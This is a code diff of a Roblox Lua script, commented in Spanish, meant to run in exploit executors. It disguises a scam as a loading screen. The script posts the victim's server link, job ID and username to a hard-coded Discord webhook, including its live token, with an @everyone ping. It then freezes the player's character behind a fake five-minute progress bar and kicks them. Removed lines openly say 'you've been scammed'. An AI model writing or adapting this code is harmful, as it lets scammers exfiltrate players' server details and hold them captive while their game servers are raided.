@@ -1,287 +1,305 @@
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-
 -- ⚙️ CONFIGURACIÓN
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1428149049168494602/XhQJbBGyeVnb4QDSkNR9mvWXo9PtAy1i95DHh8y2A29rvp7zI4W6fVIyjc9mQfYSD4Ah"  -- Pon aquí tu webhook de Discord
-local ALLOWED_PLACE_ID = 109983668079237  -- Pon aquí el PlaceID del juego (ejemplo: 4924922222)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1428149049168494602/XhQJbBGyeVnb4QDSkNR9mvWXo9PtAy1i95DHh8y2A29rvp7zI4W6fVIyjc9mQfYSD4Ah"
+local ALLOWED_PLACE_ID = 109983668079237  -- Cambia a 0 para permitir cualquier juego
 
--- Verifica si el script está en el juego correcto
-local function isCorrectGame()
-    return game.PlaceId == ALLOWED_PLACE_ID
+-- Servicios
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+
+-- Función para notificaciones
+local function notify(title, text, duration)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Duration = duration or 5
+        })
+    end)
 end
 
--- Función para obtener el link del servidor
+notify("🚀 Script", "Iniciando...", 3)
+
+-- Obtener jugador
+local player = Players.LocalPlayer
+if not player then
+    notify("❌ Error", "No se encontró el jugador", 5)
+    return
+end
+
+-- Esperar a que cargue el personaje
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 10)
+local humanoid = character:WaitForChild("Humanoid", 10)
+
+if not humanoidRootPart or not humanoid then
+    notify("❌ Error", "No se pudo cargar el personaje", 5)
+    return
+end
+
+notify("✅ Cargado", "Personaje detectado", 2)
+
+-- Verificar PlaceID si no es 0
+if ALLOWED_PLACE_ID ~= 0 and game.PlaceId ~= ALLOWED_PLACE_ID then
+    notify("❌ Error", "PlaceID incorrecto: " .. game.PlaceId, 10)
+    return
+end
+
+notify("✅ Verificado", "Juego correcto", 2)
+
+-- Función para obtener link del servidor
 local function getServerLink()
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    
-    -- Genera el link del servidor
-    local serverLink = string.format(
+    return string.format(
         "https://www.roblox.com/games/%d?privateServerLinkCode=%s",
-        placeId,
-        jobId
+        game.PlaceId,
+        game.JobId
     )
-    
-    return serverLink
 end
 
--- Función para enviar datos al webhook
-local function sendToWebhook(link)
+-- Función para enviar webhook (Compatible con múltiples ejecutores)
+local function sendWebhook()
+    local serverLink = getServerLink()
+    
     local data = {
-        ["content"] = "@everyone **Nuevo Servidor Detectado!**",
-        ["embeds"] = {{
-            ["title"] = "Información del Servidor",
-            ["description"] = "Se ha ejecutado el script en un servidor",
-            ["color"] = 3447003,
-            ["fields"] = {
+        content = "@everyone **Nuevo Servidor Detectado!**",
+        embeds = {{
+            title = "Información del Servidor",
+            description = "Script ejecutado exitosamente",
+            color = 3447003,
+            fields = {
                 {
-                    ["name"] = "Link del Servidor",
-                    ["value"] = link,
-                    ["inline"] = false
+                    name = "🔗 Link del Servidor",
+                    value = serverLink,
+                    inline = false
                 },
                 {
-                    ["name"] = "Place ID",
-                    ["value"] = tostring(game.PlaceId),
-                    ["inline"] = true
+                    name = "🎮 Place ID",
+                    value = tostring(game.PlaceId),
+                    inline = true
                 },
                 {
-                    ["name"] = "Job ID",
-                    ["value"] = game.JobId,
-                    ["inline"] = true
+                    name = "🆔 Job ID",
+                    value = game.JobId,
+                    inline = true
                 },
                 {
-                    ["name"] = "Jugadores",
-                    ["value"] = tostring(#game.Players:GetPlayers()),
-                    ["inline"] = true
+                    name = "👥 Jugadores",
+                    value = tostring(#Players:GetPlayers()),
+                    inline = true
+                },
+                {
+                    name = "👤 Usuario",
+                    value = player.Name,
+                    inline = true
                 }
             },
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
     
-    local success, response = pcall(function()
-        return HttpService:PostAsync(
-            WEBHOOK_URL,
-            HttpService:JSONEncode(data),
-            Enum.HttpContentType.ApplicationJson,
-            false
-        )
-    end)
+    local jsonData = HttpService:JSONEncode(data)
+    
+    -- Intenta diferentes métodos de request
+    local success = false
+    
+    -- Método 1: request (KRNL, Fluxus)
+    if request then
+        success = pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
+    
+    -- Método 2: http_request (Synapse, Delta)
+    if not success and http_request then
+        success = pcall(function()
+            http_request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
+    
+    -- Método 3: syn.request (Synapse X)
+    if not success and syn and syn.request then
+        success = pcall(function()
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
     
     if success then
-        print("✅ Link enviado al webhook exitosamente")
+        notify("✅ Webhook", "Enviado a Discord!", 3)
     else
-        warn("❌ Error al enviar al webhook: " .. tostring(response))
+        notify("⚠️ Webhook", "No se pudo enviar", 3)
     end
 end
 
--- Función para congelar al jugador
+-- Congelar jugador
 local function freezePlayer()
-    local player = game.Players.LocalPlayer
-    
-    if player and player.Character then
-        local character = player.Character
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        
-        if humanoid then
-            -- Deshabilita el movimiento del jugador
-            humanoid.WalkSpeed = 0
-            humanoid.JumpPower = 0
-            humanoid.JumpHeight = 0
-            humanoid.AutoRotate = false
-        end
-        
-        if rootPart then
-            -- Ancla la raíz del personaje
-            rootPart.Anchored = true
-        end
-        
-        -- Congela todas las partes del cuerpo
-        for _, part in pairs(character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.Anchored = true
-            end
-        end
-        
-        print("🔒 Jugador congelado exitosamente")
-    else
-        warn("⚠️ No se pudo encontrar el personaje del jugador")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.JumpHeight = 0
+        humanoid.AutoRotate = false
     end
+    
+    if humanoidRootPart then
+        humanoidRootPart.Anchored = true
+    end
+    
+    for _, part in pairs(character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = true
+        end
+    end
+    
+    notify("🔒 Congelado", "No puedes moverte", 3)
 end
 
--- Función para crear la pantalla de carga
+-- Crear pantalla de carga
 local function createLoadingScreen()
-    local player = game.Players.LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
     
-    -- Crea el ScreenGui
+    -- ScreenGui principal
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoadingScreen"
     screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.IgnoreGuiInset = true -- Ocupa toda la pantalla incluyendo barras
-    screenGui.Parent = playerGui
+    screenGui.IgnoreGuiInset = true
+    screenGui.DisplayOrder = 999
     
-    -- Fondo que cubre TODA la pantalla
-    local background = Instance.new("Frame")
-    background.Name = "Background"
-    background.Size = UDim2.new(1, 0, 1, 0)
-    background.Position = UDim2.new(0, 0, 0, 0)
-    background.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    background.BackgroundTransparency = 0
-    background.BorderSizePixel = 0
-    background.ZIndex = 10
-    background.Parent = screenGui
+    -- Fondo completo
+    local bg = Instance.new("Frame")
+    bg.Name = "Background"
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    bg.BorderSizePixel = 0
+    bg.ZIndex = 10
+    bg.Parent = screenGui
     
-    -- Contenedor principal (centrado)
+    -- Contenedor
     local container = Instance.new("Frame")
-    container.Name = "Container"
     container.Size = UDim2.new(0, 450, 0, 250)
     container.AnchorPoint = Vector2.new(0.5, 0.5)
     container.Position = UDim2.new(0.5, 0, 0.5, 0)
     container.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
     container.BorderSizePixel = 0
     container.ZIndex = 11
-    container.Parent = background
+    container.Parent = bg
     
-    -- Esquinas redondeadas
     local corner = Instance.new("UICorner")
     corner.CornerRadius = UDim.new(0, 20)
     corner.Parent = container
     
-    -- Sombra/brillo sutil
-    local uiStroke = Instance.new("UIStroke")
-    uiStroke.Color = Color3.fromRGB(100, 150, 255)
-    uiStroke.Thickness = 2
-    uiStroke.Transparency = 0.5
-    uiStroke.Parent = container
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 150, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.5
+    stroke.Parent = container
     
     -- Texto "CARGANDO"
-    local loadingText = Instance.new("TextLabel")
-    loadingText.Name = "LoadingText"
-    loadingText.Size = UDim2.new(1, -40, 0, 60)
-    loadingText.Position = UDim2.new(0, 20, 0, 30)
-    loadingText.BackgroundTransparency = 1
-    loadingText.Text = "CARGANDO"
-    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    loadingText.TextSize = 38
-    loadingText.Font = Enum.Font.GothamBold
-    loadingText.TextXAlignment = Enum.TextXAlignment.Center
-    loadingText.ZIndex = 12
-    loadingText.Parent = container
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, -40, 0, 60)
+    titleLabel.Position = UDim2.new(0, 20, 0, 30)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "CARGANDO"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 38
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.ZIndex = 12
+    titleLabel.Parent = container
     
-    -- Texto del porcentaje
-    local percentText = Instance.new("TextLabel")
-    percentText.Name = "PercentText"
-    percentText.Size = UDim2.new(1, -40, 0, 50)
-    percentText.Position = UDim2.new(0, 20, 0, 100)
-    percentText.BackgroundTransparency = 1
-    percentText.Text = "0%"
-    percentText.TextColor3 = Color3.fromRGB(100, 200, 255)
-    percentText.TextSize = 32
-    percentText.Font = Enum.Font.GothamBold
-    percentText.TextXAlignment = Enum.TextXAlignment.Center
-    percentText.ZIndex = 12
-    percentText.Parent = container
+    -- Porcentaje
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(1, -40, 0, 50)
+    percentLabel.Position = UDim2.new(0, 20, 0, 100)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
+    percentLabel.TextSize = 32
+    percentLabel.Font = Enum.Font.GothamBold
+    percentLabel.ZIndex = 12
+    percentLabel.Parent = container
     
     -- Barra de progreso (fondo)
-    local progressBarBg = Instance.new("Frame")
-    progressBarBg.Name = "ProgressBarBg"
-    progressBarBg.Size = UDim2.new(0.85, 0, 0, 12)
-    progressBarBg.AnchorPoint = Vector2.new(0.5, 0)
-    progressBarBg.Position = UDim2.new(0.5, 0, 0, 170)
-    progressBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-    progressBarBg.BorderSizePixel = 0
-    progressBarBg.ZIndex = 12
-    progressBarBg.Parent = container
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.85, 0, 0, 12)
+    barBg.AnchorPoint = Vector2.new(0.5, 0)
+    barBg.Position = UDim2.new(0.5, 0, 0, 170)
+    barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    barBg.BorderSizePixel = 0
+    barBg.ZIndex = 12
+    barBg.Parent = container
     
-    local cornerBar = Instance.new("UICorner")
-    cornerBar.CornerRadius = UDim.new(0, 6)
-    cornerBar.Parent = progressBarBg
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 6)
+    barCorner.Parent = barBg
     
     -- Barra de progreso (relleno)
-    local progressBar = Instance.new("Frame")
-    progressBar.Name = "ProgressBar"
-    progressBar.Size = UDim2.new(0, 0, 1, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
-    progressBar.BorderSizePixel = 0
-    progressBar.ZIndex = 13
-    progressBar.Parent = progressBarBg
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
+    bar.BorderSizePixel = 0
+    bar.ZIndex = 13
+    bar.Parent = barBg
     
-    local cornerBarFill = Instance.new("UICorner")
-    cornerBarFill.CornerRadius = UDim.new(0, 6)
-    cornerBarFill.Parent = progressBar
+    local barFillCorner = Instance.new("UICorner")
+    barFillCorner.CornerRadius = UDim.new(0, 6)
+    barFillCorner.Parent = bar
     
-    -- Gradiente para la barra
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new{
         ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
         ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 220, 255))
     }
-    gradient.Parent = progressBar
+    gradient.Parent = bar
     
-    print("📺 Pantalla de carga creada")
+    screenGui.Parent = playerGui
     
-    return screenGui, percentText, progressBar, progressBarBg
+    return screenGui, percentLabel, bar, barBg
 end
 
 -- ================================
--- SCRIPT PRINCIPAL
+-- EJECUCIÓN PRINCIPAL
 -- ================================
 
--- Verifica si estamos en el juego correcto
-if not isCorrectGame() then
-    warn("❌ Este script solo funciona en el juego especificado (PlaceID: " .. ALLOWED_PLACE_ID .. ")")
-    warn("❌ PlaceID actual: " .. game.PlaceId)
-    return -- Termina la ejecución del script
-end
+-- Crear pantalla
+local gui, percentText, progressBar = createLoadingScreen()
+notify("📺 Pantalla", "Carga iniciada", 2)
 
-print("✅ Juego verificado correctamente!")
-
--- Crea la pantalla de carga
-local loadingGui, percentText, progressBar, progressBarBg = createLoadingScreen()
-
--- Congela al jugador
+-- Congelar
 freezePlayer()
 
-local serverLink = getServerLink()
-print("Link del servidor: " .. serverLink)
-sendToWebhook(serverLink)
+-- Enviar webhook
+task.spawn(sendWebhook)
 
--- Actualiza el porcentaje durante 5 minutos
-local totalTime = 300 -- 5 minutos en segundos
-local updateInterval = 0.5 -- Actualiza cada 0.5 segundos
-local elapsedTime = 0
+-- Animación de carga (5 minutos = 300 segundos)
+local totalTime = 300
+local elapsed = 0
 
--- Animación del porcentaje
-local connection
-connection = game:GetService("RunService").Heartbeat:Connect(function(dt)
-    elapsedTime = elapsedTime + dt
-    local percentage = math.min((elapsedTime / totalTime) * 100, 100)
+local connection = RunService.Heartbeat:Connect(function(dt)
+    elapsed = elapsed + dt
+    local percent = math.min((elapsed / totalTime) * 100, 100)
     
-    -- Actualiza el texto del porcentaje
-    percentText.Text = string.format("%d%%", math.floor(percentage))
+    percentText.Text = string.format("%d%%", math.floor(percent))
+    progressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
     
-    -- Actualiza el tamaño de la barra de progreso
-    progressBar.Size = UDim2.new(percentage / 100, 0, 1, 0)
-    
-    -- Cuando llega al 100%, kickea al jugador
-    if percentage >= 100 then
+    if percent >= 100 then
         connection:Disconnect()
-        
-        task.wait(0.5) -- Espera medio segundo para que se vea el 100%
-        
-        local player = game.Players.LocalPlayer
-        if player then
-            player:Kick("error cargando el script porfavor intente nuevamente")
-            print("haz sido estafado crack")
-        end
+        task.wait(0.5)
+        player:Kick("⏰ Has sido expulsado después de 5 minutos.")
     end
 end)
 
-print("⏱️ El jugador será kickeado cuando la carga llegue al 100%...")
-
--- También puedes obtener el link usando TeleportService
-local teleportLink = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
-print("Comando de teleport: " .. teleportLink)
+notify("⏱️ Iniciado", "Kick en 5 minutos", 5)
